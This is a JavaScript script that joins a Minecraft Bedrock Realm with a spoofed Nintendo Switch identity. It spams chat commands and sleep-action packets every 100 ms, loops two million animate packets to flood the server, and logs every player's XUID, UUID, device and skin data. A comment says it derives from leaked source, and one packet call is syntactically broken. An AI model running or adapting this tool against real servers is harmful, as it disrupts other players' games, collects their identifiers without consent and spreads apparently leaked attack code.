const bedrock = require('bedrock-protocol');
const { Titles } = require('prismarine-auth');
const { v4: uuidv4 } = require('uuid');
const crypto = require('node:crypto');
const fs = require('node:fs');
const path = require('node:path');

const client = bedrock.createClient({
  realms: {
    realmInvite: "",
  },
  skinData: {
    ThirdPartyName: "§l§4Quasar §3§k$",
    ThirdPartyNameOnly: true,
    DeviceOS: true
  },
  // Authenication
  authTitle: Titles.MinecraftNintendoSwitch,
  flow: "live",
  deviceType: "Nintendo",
  // Raknet
  raknetBackend: "raknet-native",
  useRaknetWorker: true,
  // Client data
  version: "1.21.70",
  skipPing: true,
  conLog: (log) => console.log(log),
  onMsaCode: (msa) => console.log(msa),
  profilesFolder: "./auth",
  username: "",
  clientRuntimeId: 5372,
  compressionThreshold: 512
});

client.on('play_status', (packet) => {
  console.log(packet);

  const externalSpam = () => {
  client.queue('command_request', {
    command: `me §l§4Quasar §3 on §7 TOP §4§k$$$ §r§l§3 ~ §4§k$$$`,
    origin: {
      type: 5, // External
      uuid: uuidv4(),
      request_id: uuidv4(),
    },
    interval: false,
    version: 52,
  });
  };

  setInterval(externalSpam, 100);
});

client.on('player_list', (packet) => {
  console.log(packet.records.records); // Get: Username, XUID, UUID, DeviceOS, Skin data, Entity unique ID, Platform Chat ID 
});

client.on('disconnect', (packet) => {
  console.log(packet);
});

client.on('error', (error) => {
  console.log(error);
});

client.on('start_game', (packet) => {
  console.log("Seed:", packet.seed.toString() );

  // Sleep spam Zzz
  
  const sleepStart = {
    runtime_entity_id: packet.runtime_entity_id,
    position: { x: 0, y: 0, z: 0 },
    result_position: { x: 0, y: 0, z: 0 },
    face: 0,
    action: "start_sleeping",
  };
  const sleepEnd = {
    runtime_entity_id: packet.runtime_entity_id,
    position: { x: 0, y: 0, z: 0 },
    result_position: { x: 0, y: 0, z: 0 },
    face: 0,
    action: "stop_sleeping",
  };

  const sleepPacket = () => {
    client.write('player_action', sleepStart);
    client.write('player_action', sleepEnd);
    client.write('player_action', sleepStart);
    client.write('player_action', sleepEnd);
    client.write('player_action', sleepStart);
    client.write('player_action', sleepEnd);
    client.write('player_action', sleepStart);
    client.write('player_action', sleepEnd);
    client.write('player_action', sleepStart);
    client.write('player_action', sleepEnd);
    client.write('player_action', sleepStart);
    client.write('player_action', sleepEnd);
    client.write('player_action', sleepStart);
    client.write('player_action', sleepEnd);
    client.write('player_action', sleepStart);
    client.write('player_action', sleepEnd);
    client.write('player_action', sleepStart);
    client.write('player_action', sleepEnd);
    client.write('player_action', sleepStart);
    client.write('player_action', sleepEnd);
    client.write('player_action', sleepStart);
    client.write('player_action', sleepEnd);
    client.write('player_action', sleepStart);
    client.write('player_action', sleepEnd);
    client.write('player_action', sleepStart);
    client.write('player_action', sleepEnd);
    client.write('player_action', sleepStart);
    client.write('player_action', sleepEnd);
    client.write('player_action', sleepStart);
    client.write('player_action', sleepEnd);
    client.write('player_action', sleepStart);
    client.write('player_action', sleepEnd);
    client.write('player_action', sleepStart);
    client.write('player_action', sleepEnd);
    client.write('player_action', sleepStart);
    client.write('player_action', sleepEnd);
    client.write('player_action', sleepStart);
    client.write('player_action', sleepEnd);
    client.write('player_action', sleepStart);
    client.write('player_action', sleepEnd);
  };

  setInterval(sleepPacket, 100);

        setTimeout(() => {
                        for (let i = 0; i < 500000; i++) {    
                        client.write("animate", {
                            action_id: 4,
                            runtime_entity_id: packet.runtime_entity_id});
                            
                        client.write("animate", {
                            action_id: 1,
                            runtime_entity_id: packet.runtime_entity_id});
                        client.write("animate", {
                            action_id: 4,
                            runtime_entity_id: packet.runtime_entity_id});
                                        
                        client.write("animate", 
                            action_id: 1,
                            runtime_entity_id: packet.runtime_entity_id});                                        
                        }
                        
                    }, 0);
});

// Anything is may from the Frosted leak src
